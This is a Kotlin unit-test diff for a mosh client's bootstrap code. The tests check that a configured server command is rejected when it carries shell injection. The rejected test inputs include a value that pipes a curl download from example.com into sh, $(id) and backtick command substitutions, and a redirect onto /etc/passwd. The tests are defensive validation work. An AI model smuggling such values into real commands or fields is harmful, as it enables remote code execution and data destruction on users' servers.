@@ -79,4 +79,31 @@ class MoshBootstrapTest {
             assertNull("this should not have become a -p argument: $asked", MoshBootstrap.portRange(asked))
         }
     }
+
+    @Test fun `the server command is a command, not a line of shell`() {
+        for (asked in listOf("mosh-server", "/usr/local/bin/mosh-server", "~/bin/mosh-server", "ms+1.4")) {
+            assertEquals(asked, MoshBootstrap.serverCommand(asked))
+        }
+        assertEquals("surrounding space is not part of it", "mosh-server", MoshBootstrap.serverCommand("  mosh-server  "))
+    }
+
+    @Test fun `a command that is really a shell asks for nothing`() {
+        // It is interpolated into what a remote shell reads, so these would run as what they say
+        // — on the server, as the account that just logged in. A host row carrying one does not
+        // have to have been typed by its owner: it can have arrived in an imported backup.
+        for (asked in listOf(
+            "mosh-server; curl http://example.com/x | sh",
+            "mosh-server \$(id)",
+            "mosh-server `id`",
+            "mosh-server > /etc/passwd",
+            "mosh-server --with-an-argument",
+            "mosh-server&",
+            "a b",
+            "",
+            "   ",
+        )) {
+            assertNull("accepted <$asked>", MoshBootstrap.serverCommand(asked))
+        }
+        assertNull(MoshBootstrap.serverCommand(null))
+    }
 }
